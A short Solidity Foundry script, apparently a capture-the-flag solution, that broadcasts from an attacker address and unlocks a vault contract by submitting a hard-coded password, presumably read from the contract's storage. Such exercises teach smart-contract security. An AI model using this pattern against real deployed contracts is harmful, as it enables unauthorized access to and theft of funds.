// SDPX-License-Identifier: MIT

pragma solidity ^0.6.2;

import {Script} from "forge-std/Script.sol";

import {Constants} from "./Constants.s.sol";

interface IVault {
    function unlock(bytes32 password) external;
}

contract VaultAttacker is Constants, Script {

    function run() public {
        IVault victim = IVault(VAULT_ADDRESS);

        vm.startBroadcast(ATTACKER_ADDRESS);
        attack(victim);
        vm.stopBroadcast();
    }
    
    function attack(IVault victim) private {
        bytes32 password = "A very strong secret password :)";
        victim.unlock(password);
    }
}